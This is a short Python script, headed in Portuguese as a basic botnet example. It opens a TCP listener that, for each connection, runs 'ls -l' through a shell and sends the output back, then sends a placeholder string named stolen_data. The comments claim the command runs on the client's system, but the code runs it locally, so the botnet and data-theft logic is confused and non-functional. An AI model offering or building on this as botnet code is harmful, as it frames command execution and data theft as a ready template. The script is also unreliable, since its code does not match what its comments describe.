"""

Exemplo básico de botnet em python

"""

import socket
import threading
import subprocess

# Configurações da botnet
botnet_ip = '192.168.0.100'
botnet_port = 9000

# Função para lidar com cada conexão de cliente
def handle_client(client_socket):
    request = client_socket.recv(1024)
    print(f'Received request from {client_socket.getpeername()[0]}:{client_socket.getpeername()[1]}')
    
    # Executar comando no sistema do cliente
    command = 'ls -l'
    output = subprocess.check_output(command, shell=True)
    client_socket.send(output)
    
    # Coletar informações do cliente
    stolen_data = 'Informações confidenciais'
    client_socket.send(stolen_data.encode())
    
    client_socket.close()

# Função principal
def main():
    botnet_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    botnet_socket.bind((botnet_ip, botnet_port))
    botnet_socket.listen(5)
    print(f'Botnet listening on {botnet_ip}:{botnet_port}')

    while True:
        client_socket, client_address = botnet_socket.accept()
        client_thread = threading.Thread(target=handle_client, args=(client_socket,))
        client_thread.start()

if __name__ == '__main__':
    main()
